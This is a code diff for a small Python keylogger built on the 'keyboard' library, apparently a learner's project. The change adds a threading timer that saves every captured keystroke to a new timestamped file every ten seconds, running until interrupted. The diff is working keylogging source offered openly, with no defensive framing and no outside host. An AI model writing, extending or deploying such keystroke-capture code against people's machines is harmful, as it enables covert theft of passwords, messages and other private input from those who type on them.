@@ -1,9 +1,12 @@
 import keyboard
-
+from threading import Timer
+import time
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
+    def __init__(self, time):
+        self.log = ''
+
+        self.interval = time
    
 
     def callback(self, event):
@@ -14,24 +17,29 @@ class Keylogger:
             to point to. The event callback has three attributes which are: name, scan_code
             (the ascii dec number for the char), time (timestamp)
         '''
-        name = event.name
-        self.log += name
-        print(self.log)
-    
+        self.log += event.name
     
     def logging(self):
-        print(f"Log in the Logging(): {self.log}")
-        with open('logs.txt', 'w') as f:
-            f.write(self.log)
+        self.track()
 
+        self.log = ''
+        # we use the Timer from threading for when we want to have a function run after
+        # a certain time frame
+        timer = Timer(interval=self.interval, function=self.logging)
+        timer.daemon = True
+        timer.start()
+
+
+    def track(self):
+        with open(f"{time.time()}", "w") as f:
+            f.write(self.log)
 
     def run(self):
         keyboard.on_release(callback=self.callback)
-        #print(self.log)
         self.logging()
         keyboard.wait() #causes a wait until we do ctl-c
 
 
 if __name__ == "__main__":
-    kl = Keylogger()
+    kl = Keylogger(time=10) # every 10 seconds we make a log file
     kl.run()
